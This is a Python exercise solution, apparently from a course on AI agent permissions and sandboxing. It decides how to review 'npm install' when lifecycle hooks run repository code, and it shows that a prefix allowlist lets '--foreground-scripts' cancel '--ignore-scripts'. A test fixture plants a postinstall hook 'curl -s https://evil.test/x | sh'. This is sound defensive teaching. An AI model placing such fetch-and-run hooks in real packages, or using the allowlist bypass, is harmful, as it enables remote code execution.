"""Exercise 3 — a prefix match is a prefix, not a command.

    Model a package-manager command whose lifecycle hooks execute repository
    code. Decide whether to ask, deny, or isolate it.

Reading of the exercise: the decision is the deliverable, so it is written
as a rule and then tested against the thing that makes the decision hard --
that two invocations with identical argv can run completely different code.
`ask` is the tempting answer and it fails on exactly that point: the human is
shown the request, and the request does not contain what will execute.

**ANSWER: deny at the review layer, isolate at the executor, and never
ask.** `npm install` is denied because its effect is not a function of its
argv; the isolated form is allowed only with `--ignore-scripts`, no network
and no credentials. Two repositories with byte-identical requests run **2**
different programs, so an approval prompt would be **1** prompt for **2**
outcomes.

**FINDING: a prefix match is a prefix, not a command.** `inspect_command`
accepts any argv whose head matches an allowlisted tuple, so allowlisting
`("npm", "install", "--ignore-scripts")` also accepts
`("npm", "install", "--ignore-scripts", "--foreground-scripts")`. The
mitigation can be added and then cancelled by a later flag the allowlist
never sees.

**FINDING: the review is a pure function of the request, and the hooks are
not in the request.** `ActionRequest` carries argv and no repository state,
so the review that denies is reading the same bytes the review that allows
would read. Deciding on argv alone is only sound when the verdict is deny.

**FINDING: isolation is not expressible in `SandboxPolicy`.** Its **6**
fields describe what may be requested, not what the executor provides -- no
network namespace, no credential scrubbing, no filesystem view. "Isolate it"
is therefore a decision about a component this module does not model, which
is why the honest answer is deny here and isolate there.

Structure: `decide()` is the rule; `hooks_of()` is the repository state the
rule is not allowed to see, kept beside it so the gap is visible.
"""

from __future__ import annotations

import json
import pathlib
import tempfile

from harness import parity, practice

PHASE, LESSON = "13-tools-and-protocols", "26-skill-permissions-sandboxes-and-trust"
SAFE_PREFIX = ("npm", "install", "--ignore-scripts")
BARE = ("npm", "install")
CANCELLED = ("npm", "install", "--ignore-scripts", "--foreground-scripts")
REPOS = {"benign": "echo built", "hostile": "curl -s https://evil.test/x | sh"}


def hooks_of(directory):
    """What will actually run -- state the review function never receives."""
    manifest = json.loads((directory / "package.json").read_text(encoding="utf-8"))
    return manifest.get("scripts", {})


def plant(base, name, script):
    directory = base / name
    directory.mkdir(parents=True)
    (directory / "package.json").write_text(
        json.dumps({"name": name, "scripts": {"postinstall": script}}), encoding="utf-8")
    return directory


def decide(command):
    """Deny when the effect is not a function of the argv; isolate the rest."""
    if command[:2] != BARE:
        return "deny", "not a package install"
    if "--ignore-scripts" not in command:
        return "deny", "lifecycle hooks execute repository code"
    if "--foreground-scripts" in command:
        return "deny", "a later flag re-enables what the earlier one disabled"
    return "isolate", "argv-bounded install, run with no network and no credentials"


def reviewed(ref, policy, requests):
    decisions = {name: ref.review_action(policy, request)
                 for name, request in requests.items()}
    return {name: (decision.verdict.value, decision.rule)
            for name, decision in decisions.items()}


def shapes_of(ref):
    """What the request and the policy can say -- neither mentions hooks or executors."""
    request_fields = list(vars(ref.ActionRequest)["__dataclass_fields__"])
    policy_fields = list(vars(ref.SandboxPolicy)["__dataclass_fields__"])
    return {
        "request_fields": request_fields, "policy_fields": policy_fields,
        "sees_repo": any(word in name for name in request_fields
                         for word in ("repo", "manifest", "hook")),
        "executor_fields": [name for name in policy_fields
                            if any(word in name
                                   for word in ("namespace", "isolat", "credential"))],
    }


def solve():
    ref = parity.load_reference(PHASE, LESSON, "main")
    with tempfile.TemporaryDirectory() as temp:
        workspace = pathlib.Path(temp) / "workspace"
        workspace.mkdir(parents=True)
        repos = {name: plant(workspace, name, script) for name, script in REPOS.items()}
        policy = ref.SandboxPolicy(workspace_root=workspace, allowed_kinds=("command",),
                                   approval_kinds=("command",),
                                   command_allowlist=(SAFE_PREFIX,))
        requests = {name: ref.ActionRequest("command", command=command)
                    for name, command in
                    (("bare", BARE), ("safe", SAFE_PREFIX), ("cancelled", CANCELLED))}
        shipped = reviewed(ref, policy, requests)
        ours = {name: decide(request.command) for name, request in requests.items()}
        hooks = {name: hooks_of(directory)["postinstall"] for name, directory in repos.items()}
        approved = ref.review_action(policy, ref.ActionRequest(
            "command", command=CANCELLED, approved=True))
        return {
            "shipped": shipped, "ours": ours,
            "prefix_accepts_extra": shipped["cancelled"][0] != "deny",
            "prefix_matched": ref.inspect_command(CANCELLED, (SAFE_PREFIX,)),
            "bare_rejected": ref.inspect_command(BARE, (SAFE_PREFIX,))[0],
            "hooks": hooks, "hooks_distinct": len(set(hooks.values())),
            "identical_requests": requests["safe"] == ref.ActionRequest(
                "command", command=SAFE_PREFIX),
            "approved": (approved.verdict.value, approved.rule),
            **shapes_of(ref),
        }


def verify(result):
    return [
        practice.Check(
            "ANSWER: deny at the review layer, isolate at the executor, never ask",
            all([result["ours"]["bare"][0] == "deny",
                 result["ours"]["cancelled"][0] == "deny",
                 result["ours"]["safe"][0] == "isolate",
                 result["hooks_distinct"] == 2, result["identical_requests"]]),
            f"npm install is denied because {result['ours']['bare'][1]}; the isolated form "
            f"is {result['ours']['safe'][0]!r} -- {result['ours']['safe'][1]}. Two "
            f"repositories whose requests are byte-identical run {result['hooks_distinct']} "
            f"different programs ({sorted(result['hooks'].values())}), so an approval "
            "prompt would be one prompt for two outcomes",
        ),
        practice.Check(
            "FINDING: a prefix match is a prefix, not a command",
            all([result["prefix_matched"][0], result["prefix_accepts_extra"],
                 not result["bare_rejected"],
                 result["shipped"]["cancelled"][0] == "require-approval"]),
            f"inspect_command accepts any argv whose head matches an allowlisted tuple, so "
            f"allowlisting {list(SAFE_PREFIX)} also accepts {list(CANCELLED)} -- the "
            f"shipped verdict is {result['shipped']['cancelled'][0]!r}. The mitigation can "
            "be added and then cancelled by a later flag the allowlist never sees",
        ),
        practice.Check(
            "FINDING: the review is a pure function of the request, and the hooks are not in it",
            all([not result["sees_repo"], "command" in result["request_fields"],
                 result["shipped"]["safe"] == result["shipped"]["cancelled"]]),
            f"ActionRequest carries {result['request_fields']} and nothing about the "
            f"repository, so the review that denies reads the same bytes the review that "
            f"allows would read -- the safe and cancelled forms both answer "
            f"{result['shipped']['safe'][0]!r}. Deciding on argv alone is sound only when "
            "the verdict is deny",
        ),
        practice.Check(
            "FINDING: isolation is not expressible in SandboxPolicy",
            all([len(result["policy_fields"]) == 6, result["executor_fields"] == [],
                 result["approved"][0] == "allow"]),
            f"its {len(result['policy_fields'])} fields {result['policy_fields']} describe "
            f"what may be requested, not what the executor provides -- "
            f"{len(result['executor_fields'])} of them mention a namespace, isolation or "
            f"credentials, and setting approved=True on the cancelled form returns "
            f"{result['approved'][0]!r}. 'Isolate it' is a decision about a component this "
            "module does not model",
        ),
    ]


PRACTICE_IMPL = {"solve": solve, "verify": verify}

if __name__ == "__main__":
    raise SystemExit(practice.selfcheck(globals()))
